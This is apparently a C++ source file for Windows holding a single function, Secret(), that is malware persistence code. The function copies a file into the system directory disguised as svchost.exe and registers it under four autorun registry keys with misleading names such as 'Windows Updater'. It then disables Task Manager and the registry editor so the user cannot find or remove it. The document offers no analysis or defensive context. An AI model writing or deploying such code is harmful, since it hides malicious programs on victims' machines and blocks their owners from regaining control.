#include "data_globals.h"
#include <windows.h>
#include <cstring>

void Secret(LPCSTR sourceFilePath)
{
    char systemPath[MAX_PATH];
    HKEY hKey;
    BYTE enable[4] = {1, 0, 0, 0};

    GetSystemDirectoryA(systemPath, MAX_PATH);

    size_t len = strlen(systemPath);
    strcpy(systemPath + len, "\\Generic");
    CreateDirectoryA(systemPath, NULL);

    len = strlen(systemPath);
    strcpy(systemPath + len, "\\svchost.exe");
    CopyFileA(sourceFilePath, systemPath, FALSE);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Generic Host Process for Win32 Services", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Updater", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Server", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Generic", 0,
                   REG_SZ, (const BYTE*)systemPath, (DWORD)(strlen(systemPath) + 1));
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "DisableTaskMgr", 0,
                   REG_DWORD, enable, sizeof(enable));
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "DisableRegistrytools", 0,
                   REG_DWORD, enable, sizeof(enable));
    RegCloseKey(hKey);
}
